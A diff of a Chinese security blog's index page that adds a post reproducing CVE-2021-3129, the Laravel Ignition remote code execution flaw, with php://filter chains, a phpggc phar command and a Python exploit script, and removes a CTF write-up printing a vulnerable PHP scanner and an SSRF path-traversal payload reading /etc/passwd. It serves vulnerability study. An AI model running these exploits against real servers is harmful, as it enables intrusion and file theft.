@@ -207,6 +207,166 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/c884ec29bf3ccc94.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/header.jpg">
+      <meta itemprop="name" content="XiaoLeung">
+      <meta itemprop="description" content="随笔、分享、记录生活">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xiao Leung's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/articles/c884ec29bf3ccc94.html" class="post-title-link" itemprop="url">CVE-2021-3129复现</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-04-27 23:44:43" itemprop="dateCreated datePublished" datetime="2021-04-27T23:44:43+08:00">2021-04-27</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-04-28 00:14:52" itemprop="dateModified" datetime="2021-04-28T00:14:52+08:00">2021-04-28</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>4.2k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>4 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>Laravel&lt;8.4.3&amp;&amp;Facade Ignition &lt; 2.5.2 在在Debug模式下，Ignition某些接口并未做过滤，导致file_get_contents()和file_put_contents()，函数参数被控制，黑客可通过控制日志文件引起Phar反序列化执行远程代码.</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>假设我们在模板中使用了一个不存在的变量，那么Ignition会提出解决方案使用三目运算符将变量置为空。</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210422-091932@2x.png" alt="WX20210422-091932@2x"></p>
+<p>我们点击<code>Make variable optional</code>会调用一些方法来替换模板上的变量。我们抓取这个数据包进行分析：</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210422-092155@2x.png" alt="WX20210422-092155@2x"></p>
+<p>可以看到其调用解决方案在<code>Ignition\\Solutions\\MakeViewVariableOptionalSolution</code>下，并提供两个参数跟别是需要修改的变量，模板文件的位置。</p>
+<p>我们先从<code>src/IgnitionServiceProvider.php</code>寻找对应post的路由进行追溯。</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210422-092858@2x.png" alt="3"></p>
+<p>很明显直接调用了<code>ExecuteSolutionController</code>追溯下去是是一个单行为的控制器，直接将参数传入了<code>run</code>方法.</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210422-093035@2x.png" alt="WX20210422-093035@2x"></p>
+<p>通过<code>run</code>方法会将参数传递到各个解决方案之中。</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210422-093353@2x.png" alt="WX20210422-093353@2x"></p>
+<p>我们直接到追溯到<code>src/Solutions/MakeViewVariableOptionalSolution.php</code>。</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210422-093643@2x.png" alt="WX20210422-093643@2x"></p>
+<p>可以观察到，先将参数传入<code>makeOptional</code>处理完毕后若返回值不为null就能够调用到<code>file_put_contents</code>。我们追溯<code>makeOptional</code>方法，可以看到<code>file_get_contents</code>是完全可控的。如果网站存在上传功能可以直接上传phar文件进行反序列化，这里不做讨论。</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210422-094346@2x.png" alt="WX20210422-094346@2x"></p>
+<p>这里对<code>$parameters[&#39;variableName&#39;]</code>几乎是不可控的，因为代码使用<code>token_get_all</code>进行了处理，然后同功能遍历返回值进行判断是否存在<a href="http://php.net/manual/zh/tokens.php" target="_blank" rel="noopener">解析器代号列表</a>中的对应代号，简单的说代码对我们传入的参数进行了PHP结构分析，假设我们修改了参数，代码会进行结果对比阻止我们的行为。</p>
+<blockquote>
+<p><strong>token_get_all</strong>() 解析提供的 <code>source</code> 源码字符，然后使用 Zend 引擎的语法分析器获取源码中的 <strong>PHP</strong> 语言的解析器代号</p>
+<p>解析器代号列表见<a href="http://php.net/manual/zh/tokens.php" target="_blank" rel="noopener">解析器代号列表</a>, 或者使用 <a href="http://php.net/manual/zh/function.token-name.php" target="_blank" rel="noopener">token_name()</a> 翻译获取这个代号的字符串表示.</p>
+</blockquote>
+<p>前面说了，<code>file_get_contents</code>所有变量是可控的，我们要想RCE有两条路：①上传文件进行反序列化②写入日志文件进行反序列化</p>
+<p>我们接下来来分析第二条路径。laravel默认日志路径存储在<code>storage/logs/laravel.log</code>.假设我们加载一个存在的<code>view</code>错误的日志文件将会存储在这里。</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210422-101124@2x.png" alt="WX20210422-101124@2x"></p>
+<p>虽日志文件内容可控，但是日志文件后缀无法改变。我们能否写入Phar文件进行反序列化呢？但是日志文件存在许多的“废代码”，但是phar文件必须以<code>__HALT_COMPILER();?&gt;</code>结尾，可以简答理解<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>xxx的内容不限。</p>
+<p>要想清除多余的代码，我们很容易地联想到P神的<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">谈一谈php://filter的妙用</a>文章巧妙地利用base64的特性吃掉了多余的代码。但是base64是4比特一组但是如果等于号在中间合法的base64字符将不会被忽略，同时观察日志内容，我们注入的代码只是很小的一部分，前后都有对应的堆栈跟踪信息，我很难确保内容不会出错。面对这样的问题，作者提出了将日志内容直接清空的想法。</p>
+<h3 id="Trick-1"><a href="#Trick-1" class="headerlink" title="Trick 1"></a>Trick 1</h3><p>作者提出存在一个未被官方文档记录的过滤器<code>consumed</code>它能够清除文件内容</p>
+<pre><code class="php">php://filter/read=consumed/resource=../storage/logs/laravel.log</code></pre>
+<h3 id="Trick-2"><a href="#Trick-2" class="headerlink" title="Trick 2"></a>Trick 2</h3><pre><code class="php">php://filter/read=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log</code></pre>
+<p>先将内容从UTF8转换为UTF16将结果进行<code>quoted-printable</code>编码，之后再转换为UTF-8.之后进行base64解码得到这样就吃掉没有用的字符了。</p>
+<p>我们将payload写入之后如何转换为正确的phar文件呢？</p>
+<p>我们写入一个较长的Payload观察一下日志有哪些规律。可以看到payload完全出现的地方有两个。</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210422-161405@2x.png" alt="WX20210422-161405@2x"></p>
+<p>结构可以简单记作：</p>
+<pre><code>[x1]payload[x2]payload[x3]</code></pre><p>那么怎么才能去掉[x1]….[x2]…[x3]这些非payload的内容呢。我们前面所说，base64没法完全吃掉所有的字符，我们只能将这些字符转换为base64所规定的非法字符。</p>
+<p>UTF-16将UTF-16以外的字符转换为base64非法字符</p>
+<p>例如：</p>
+<pre><code class="php">echo -ne &#39;[x1]p\0a\0y\0l\0o\0a\0d\0[x2]p\0a\0y\0l\0o\0a\0d\0[x3]&#39; &gt;test.txt</code></pre>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210425-110616@2x.png" alt="WX20210425-110616@2x"></p>
+<p>由于utf-16 使用两个字节所以在后面加多一个字节导致后面解析失败,这样咱们就可以只保留下来一个payload</p>
+<pre><code class="php">echo -ne &#39;[x1]p\0a\0y\0l\0o\0a\0d\0X[x2]p\0a\0y\0l\0o\0a\0d\0X[x3]&#39; &gt;test.txt</code></pre>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210425-112338@2x.png" alt="WX20210425-112338@2x"></p>
+<p>接下来我们需要对空字节进行处理，因为<code>file_get_contents</code>在遇到空字节时候会抛出<code>warning</code>我们需要对空字节进行编码也就是使用<code>convert.quoted-printable-decode</code>。</p>
+<p>至此转换连构造</p>
+<pre><code class="PHP">php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log</code></pre>
+<p>综上攻击思路如下：</p>
+<pre><code class="php">1. 编码构造 payloadb64 -&gt; quoted-printable ，这里构造好后，还要在末尾添加一字符，确保有且只有一处是完整的 payload 。
+2. 清空 log 文件
+3. 发送无害 payload 对齐
+4. 发送攻击 payload
+5. 解码转换 log 至 pharquoted-printable -&gt; utf-16 转 utf-8 -&gt; b64
+6. phar 伪协议执行</code></pre>
+<p>手动Burpsuite没有复现出来，原因不明，编写脚本复现成功：</p>
+<p>其中phar，最终生成的payload加上个a对齐。</p>
+<pre><code class="shell">php -d &quot;phar.readonly=0&quot; ./phpggc Laravel/RCE7 system id --phar phar -o php://output | base64 -w 0 | python -c &quot;import sys;print(&#39;&#39;.join([&#39;=&#39; + hex (ord(i))[2:] + &#39;=00&#39; for i in sys.stdin.read()]).upper())&gt;payload.txt</code></pre>
+<p>最终</p>
+<pre><code class="python">import requests
+import json
+headers = {
+    &quot;Content-Type&quot;:&quot;application/json&quot;
+}
+
+payload = {
+&quot;clean&quot; : &quot;php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;,
+&quot;add&quot; : &quot;AA&quot;,
+&quot;phar&quot; : &quot;=50=00=44=00=39=0........00=52=00=42=00=73=00=31=00=72=00=6D=00=61=00=6B=00=59=00=51=00=68=00=6D=00=4E=00=52=00=79=00=32=00=32=00=41=00=67=00=41=00=41=00=41=00=45=00=64=00=43=00=54=00=55=00=49=00=3D=00a&quot;,
+&quot;decode&quot; : &quot;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;,
+&quot;attack&quot; : &quot;phar://../storage/logs/laravel.log&quot;
+}
+
+url = &quot;http://xxx/_ignition/execute-solution&quot;
+for i in payload:
+    data={&quot;solution&quot;:&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,
+    &quot;parameters&quot;:{
+    &quot;variableName&quot;:&quot;$name&quot;,
+    &quot;viewFile&quot;:&quot;%s&quot;%(payload[i])
+    }
+    }
+    r = requests.post(url,data=json.dumps(data),headers=headers)
+print(r.text)</code></pre>
+<p><img src="https://goodcheerleung.gitee.io/macpic/QQ20210427-231128@2x.png" alt="QQ20210427-231128@2x"></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.anquanke.com/post/id/231459#h3-5" target="_blank" rel="noopener">https://www.anquanke.com/post/id/231459#h3-5</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/dc8174427b9bdba4.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2262,238 +2422,6 @@ module.exports = router;</code></pre>
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/babyphp_Write_Up.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/header.jpg">
-      <meta itemprop="name" content="XiaoLeung">
-      <meta itemprop="description" content="随笔、分享、记录生活">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Xiao Leung's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/articles/babyphp_Write_Up.html" class="post-title-link" itemprop="url">XCTF鲲鹏专场babyphp Write Up</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-12-23 12:44:00" itemprop="dateCreated datePublished" datetime="2020-12-23T12:44:00+08:00">2020-12-23</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-01-21 17:26:49" itemprop="dateModified" datetime="2021-01-21T17:26:49+08:00">2021-01-21</time>
-              </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>4.3k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>4 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="babyphp-Write-Up"><a href="#babyphp-Write-Up" class="headerlink" title="babyphp Write Up"></a>babyphp Write Up</h1><p>题目是一个内网的扫描器，直接扫描内网端口看看。抓包发现提示去谷歌搜索找源码</p>
-<p><img src="http://goodcheerleung.gitee.io/macpic/WX20201223-192602@2x.png" alt="WX20201223-192602@2x"></p>
-<p>谷歌搜到源码：</p>
-<pre><code class="php">&lt;?php
-
-set_time_limit(0);//设置程序执行时间
-ob_implicit_flush(True);
-ob_end_flush();
-$url = isset($_REQUEST[&#39;url&#39;])?$_REQUEST[&#39;url&#39;]:null; 
-
-/*端口扫描代码*/
-function check_port($ip,$port,$timeout=0.1) {
- $conn = @fsockopen($ip, $port, $errno, $errstr, $timeout);
- if ($conn) {
- fclose($conn);
- return true;
- }
-}
-
-
-function scanip($ip,$timeout,$portarr){
-foreach($portarr as $port){
-if(check_port($ip,$port,$timeout=0.1)==True){
-echo &#39;Port: &#39;.$port.&#39; is open&lt;br/&gt;&#39;;
-@ob_flush();
-@flush();
-
-}
-
-}
-}
-
-echo &#39;&lt;html&gt;
-&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;
-&lt;input type=&quot;text&quot; name=&quot;startip&quot; value=&quot;Start IP&quot; /&gt;
-&lt;input type=&quot;text&quot; name=&quot;endip&quot; value=&quot;End IP&quot; /&gt;
-&lt;input type=&quot;text&quot; name=&quot;port&quot; value=&quot;80,8080,8888,1433,3306&quot; /&gt;
-Timeout&lt;input type=&quot;text&quot; name=&quot;timeout&quot; value=&quot;10&quot; /&gt;&lt;br/&gt;
-&lt;button type=&quot;submit&quot; name=&quot;submit&quot;&gt;Scan&lt;/button&gt;
-&lt;/form&gt;
-&lt;/html&gt;
-&#39;;
-
-if(isset($_POST[&#39;startip&#39;])&amp;&amp;isset($_POST[&#39;endip&#39;])&amp;&amp;isset($_POST[&#39;port&#39;])&amp;&amp;isset($_POST[&#39;timeout&#39;])){
-
-$startip=$_POST[&#39;startip&#39;];
-$endip=$_POST[&#39;endip&#39;];
-$timeout=$_POST[&#39;timeout&#39;];
-$port=$_POST[&#39;port&#39;];
-$portarr=explode(&#39;,&#39;,$port);
-$siparr=explode(&#39;.&#39;,$startip);
-$eiparr=explode(&#39;.&#39;,$endip);
-$ciparr=$siparr;
-if(count($ciparr)!=4||$siparr[0]!=$eiparr[0]||$siparr[1]!=$eiparr[1]){
-exit(&#39;IP error: Wrong IP address or Trying to scan class A address&#39;);
-}
-if($startip==$endip){
-echo &#39;Scanning IP &#39;.$startip.&#39;&lt;br/&gt;&#39;;
-@ob_flush();
-@flush();
-scanip($startip,$timeout,$portarr);
-@ob_flush();
-@flush();
-exit();
-}
-
-if($eiparr[3]!=255){
-$eiparr[3]+=1;
-}
-while($ciparr!=$eiparr){
-$ip=$ciparr[0].&#39;.&#39;.$ciparr[1].&#39;.&#39;.$ciparr[2].&#39;.&#39;.$ciparr[3];
-echo &#39;&lt;br/&gt;Scanning IP &#39;.$ip.&#39;&lt;br/&gt;&#39;;
-@ob_flush();
-@flush();
-scanip($ip,$timeout,$portarr);
-$ciparr[3]+=1;
-
-if($ciparr[3]&gt;255){
-$ciparr[2]+=1;
-$ciparr[3]=0;
-}
-if($ciparr[2]&gt;255){
-$ciparr[1]+=1;
-$ciparr[2]=0;
-}
-}
-}
-
-/*内网代理代码*/
-
-function getHtmlContext($url){ 
-    $ch = curl_init(); 
-    curl_setopt($ch, CURLOPT_URL, $url); 
-    curl_setopt($ch, CURLOPT_HEADER, TRUE);    //表示需要response header 
-    curl_setopt($ch, CURLOPT_NOBODY, FALSE); //表示需要response body 
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE); 
-    curl_setopt($ch, CURLOPT_TIMEOUT, 120); 
-    $result = curl_exec($ch); 
-  global $header; 
-  if($result){ 
-       $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE); 
-       $header = explode(&quot;\r\n&quot;,substr($result, 0, $headerSize)); 
-       $body = substr($result, $headerSize); 
-  } 
-    if (curl_getinfo($ch, CURLINFO_HTTP_CODE) == &#39;200&#39;) { 
-        return $body; 
-    } 
-    if (curl_getinfo($ch, CURLINFO_HTTP_CODE) == &#39;302&#39;) { 
-    $location = getHeader(&quot;Location&quot;); 
-    if(strpos(getHeader(&quot;Location&quot;),&#39;http://&#39;) == false){ 
-      $location = getHost($url).$location; 
-    } 
-        return getHtmlContext($location); 
-    } 
-    return NULL; 
-} 
-
-function getHost($url){ 
-    preg_match(&quot;/^(http:\/\/)?([^\/]+)/i&quot;,$url, $matches); 
-    return $matches[0]; 
-} 
-function getCss($host,$html){ 
-    preg_match_all(&quot;/&lt;link[\s\S]*?href=[&#39;\&quot;](.*?[.]css.*?)[\&quot;&#39;][\s\S]*?&gt;/i&quot;,$html, $matches); 
-    foreach($matches[1] as $v){ 
-    $cssurl = $v; 
-        if(strpos($v,&#39;http://&#39;) == false){ 
-      $cssurl = $host.&quot;/&quot;.$v; 
-    } 
-    $csshtml = &quot;&lt;style&gt;&quot;.file_get_contents($cssurl).&quot;&lt;/style&gt;&quot;; 
-    $html .= $csshtml; 
-  } 
-  return $html; 
-} 
-
-if($url != null){ 
-
-    $host = getHost($url); 
-    echo getCss($host,getHtmlContext($url)); 
-}
-?&gt;</code></pre>
-<p>发现除了代码功能还存在SSRF。通过GET传参，可以调用<code>getHtmlContext()</code>获取页面源码，而<code>getCss()</code>能够获取页面的CSS。<code>getHtmlContext()</code>虽然能够通过<code>file:\\</code>协议读取flag，但是返回的code必须是200才有可能返回内容，如果是这里getflag的话必须要让code为200，暂时不知道有没有方法，暂时放一边。</p>
-<p><img src="http://goodcheerleung.gitee.io/macpic/WX20201223-194621@2x.png" alt="WX20201223-194621@2x"></p>
-<p>第二个就是<code>getCss()</code>中的<code>file_get_contents()</code>,其中的参数<code>「$cssurl」</code>来源于<code>getHtmlContext()</code>读取远程页面内容中匹配到的<code>&lt;link&gt;</code>标签中的<code>href</code>.那么我们是否能够控制远程页面中的<code>&lt;link&gt;</code>标签中的<code>href</code>为flag地址，从而读取到flag呢？</p>
-<p><img src="http://goodcheerleung.gitee.io/macpic/WX20201223-195012@2x.png" alt="WX20201223-195012@2x"></p>
-<p>但是这个正则表达式需要匹配css文件，但是这歌正则只需要含有<code>.css</code>这个关键字即可。</p>
-<p><img src="http://goodcheerleung.gitee.io/macpic/WX20201223-195239@2x.png" alt="WX20201223-195239@2x"></p>
-<p>但是代码中需要含有<code>http://</code>否则会自动拼接一个<code>http://host</code></p>
-<p><img src="http://goodcheerleung.gitee.io/macpic/WX20201223-195416@2x.png" alt="WX20201223-195416@2x"></p>
-<p>我们知道<code>file_get_contents</code>这个函数在遇到不认识的协议头会造成目录穿越问题。同时<code>strpos($v,&#39;http://&#39;)</code>只是字符串中是否存在<code>http://</code>而没有写死。我们只需要添加协议头中含有<code>http：//</code>即可。例如：<code>shttp://</code>所以我们构造如下payload即可：</p>
-<pre><code class="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot;  href=&quot;shttp:///../../../../../../../../../etc/password/.css/../../../../../../etc/passwd&quot; /&gt;</code></pre>
-<p>将上面payload保存的自己的服务器，再提交给靶机即可直接读取到/etc/passwd</p>
-<p><img src="http://goodcheerleung.gitee.io/macpic/WX20201223-200254@2x.png" alt="WX20201223-200254@2x"></p>
-<p>修改一下读取flag。</p>
-<p><img src="http://goodcheerleung.gitee.io/macpic/WX20201223-200056@2x.png" alt="WX20201223-200056@2x"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -2565,7 +2493,7 @@ if($url != null){
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">76</span>
+          <span class="site-state-item-count">77</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -2636,12 +2564,12 @@ if($url != null){
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">283k</span>
+    <span title="站点总字数">287k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">4:17</span>
+    <span title="站点阅读时长">4:21</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
